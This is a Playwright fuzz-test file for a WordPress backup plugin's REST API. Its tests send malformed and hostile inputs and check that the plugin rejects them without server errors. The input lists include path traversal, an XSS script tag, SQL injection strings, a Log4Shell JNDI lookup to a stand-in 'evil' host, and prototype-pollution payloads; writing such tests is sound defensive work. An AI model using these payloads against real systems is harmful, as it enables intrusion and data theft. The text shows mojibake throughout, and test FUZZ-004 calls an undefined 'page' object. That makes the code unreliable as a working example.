/**
 * 09-fuzz.spec.ts
 * Deep QA: fuzz testing.
 *
 * Random / weird inputs to settings, destination config, schedule, labels.
 * The aim is "no 500s, no PHP fatals, no data loss" â€” graceful rejection
 * is the only acceptable behaviour for invalid input.
 */
import { test, expect } from '@playwright/test';
import { getNonce, apiPost, apiPut, BASE, NS } from './_helpers';

test.beforeEach(async ({ page }) => {
  await page.goto(`${BASE}/wp-admin/admin.php?page=nxt-backup`);
});

const RANDOM_STRINGS = [
  '',
  ' ',
  '\x00',
  '\n\r\t',
  'ðŸ¦€'.repeat(50),
  'â€®â€®',                // RTL override sneak
  '../etc/passwd',
  'AAAAAAAAAA'.repeat(1000),
  '<script>alert(1)</script>',
  'DROP TABLE wp_users;',
  '__proto__',
  'constructor.prototype',
  '${jndi:ldap://evil}',
  '%n%n%n%n',
  '\\\\.\\globalroot\\hello',
];

const RANDOM_NUMBERS = [0, -1, 1.5, NaN, Infinity, -Infinity, 2 ** 53, -(2 ** 53)];

// â”€â”€ Fuzz settings: split_archive_mb â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
for (const v of RANDOM_NUMBERS) {
  test(`@deep FUZZ-001 â€” PUT settings split_archive_mb=${v} does not 500`, async ({ page }) => {
    const nonce = await getNonce(page);
    const res   = await apiPut(page, nonce, '/backup/settings', {
      split_archive_mb: v,
    });
    expect([200, 400, 422]).toContain(res.status());
  });
}

// â”€â”€ Fuzz destination label â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
for (const s of RANDOM_STRINGS) {
  test(`@deep FUZZ-002 â€” PUT destinations with label=${JSON.stringify(s.slice(0, 20))} does not 500`, async ({ page }) => {
    const nonce = await getNonce(page);
    const res   = await apiPut(page, nonce, '/backup/destinations', {
      type:    'local',
      label:   s,
      enabled: false,
      config:  {},
    });
    expect([200, 400, 422]).toContain(res.status());
    if (res.status() === 200) {
      // Cleanup
      const id = (await res.json()).data?.id as string;
      await page.request.delete(`${NS}/backup/destinations/${id}`, {
        headers: { 'X-WP-Nonce': nonce, 'Content-Type': 'application/json' },
        data:    { confirm_password: process.env.WP_ADMIN_PASS ?? 'password' },
      });
    }
  });
}

// â”€â”€ Fuzz schedule fields â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
test('@deep FUZZ-003 â€” Schedule with weird interval string does not 500', async ({ page }) => {
  const nonce = await getNonce(page);
  for (const s of RANDOM_STRINGS.slice(0, 10)) {
    const res = await apiPut(page, nonce, '/backup/settings', {
      schedule_files_interval: s,
    });
    expect([200, 400, 422]).toContain(res.status());
  }
});

// â”€â”€ Fuzz pair code â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
test('@deep FUZZ-004 â€” POST /pair/accept with random codes does not 500', async ({ request }) => {
  for (const s of RANDOM_STRINGS.slice(0, 10)) {
    const res = await page.request.post(`${NS}/backup/pair/accept`, {
      headers: { 'Content-Type': 'application/json' },
      data:    { code: s },
    });
    // Acceptable: 400 (invalid), 401, 422, 429 (rate limit)
    expect([400, 401, 403, 422, 429]).toContain(res.status());
  }
});

// â”€â”€ Fuzz settings export â†’ import malformed â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
test('@deep FUZZ-005 â€” Settings import with garbage payload does not 500', async ({ page }) => {
  const nonce = await getNonce(page);

  const garbage = [
    {},
    { settings: 'not-an-object' },
    { schedule_files_interval: { nested: 'object' } },
    { __proto__: { isAdmin: true } },
    Array(1000).fill('item'),
  ];

  for (const g of garbage) {
    const res = await apiPost(page, nonce, '/backup/settings/import', g);
    expect([200, 400, 422]).toContain(res.status());
  }
});

// â”€â”€ Fuzz restore body â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
test('@deep FUZZ-006 â€” POST /backup/restore/{id} with random components array', async ({ page }) => {
  const nonce = await getNonce(page);
  // Use any backup id (will 404 if none exist â€” still tests the parser)
  const id = 'fuzz-' + Date.now();
  for (const c of [
    null, [], 'string-not-array', [1, 2, 3], [{ obj: true }],
    Array(100).fill('db'),
  ]) {
    const res = await apiPost(page, nonce, `/backup/restore/${id}`, {
      components:       c,
      confirm_password: process.env.WP_ADMIN_PASS ?? 'password',
    });
    expect([200, 400, 404, 422]).toContain(res.status());
  }
});

// â”€â”€ Fuzz destination config â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
test('@deep FUZZ-007 â€” PUT destinations with random config blob does not 500', async ({ page }) => {
  const nonce  = await getNonce(page);
  const blobs: unknown[] = [
    { huge_array: Array(1000).fill('x') },
    { deeply: { nested: { object: { with: { many: { keys: true } } } } } },
    { number: NaN },
    { unicode: 'ðŸš€'.repeat(100) },
    { sql: "1' OR '1'='1" },
  ];

  for (const b of blobs) {
    const res = await apiPut(page, nonce, '/backup/destinations', {
      type:    'local',
      label:   'fuzz',
      enabled: false,
      config:  b,
    });
    expect([200, 400, 422]).toContain(res.status());
    if (res.status() === 200) {
      const id = (await res.json()).data?.id as string;
      await page.request.delete(`${NS}/backup/destinations/${id}`, {
        headers: { 'X-WP-Nonce': nonce, 'Content-Type': 'application/json' },
        data:    { confirm_password: process.env.WP_ADMIN_PASS ?? 'password' },
      });
    }
  }
});

// â”€â”€ Verify no 5xx from any fuzz round â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
test('@deep FUZZ-008 â€” No previous fuzz call left the plugin in a 500-on-stats state', async ({ page }) => {
  const nonce = await getNonce(page);
  const res   = await page.request.get(`${NS}/backup/stats`, {
    headers: { 'X-WP-Nonce': nonce },
  });
  expect(res.status()).toBe(200);
});
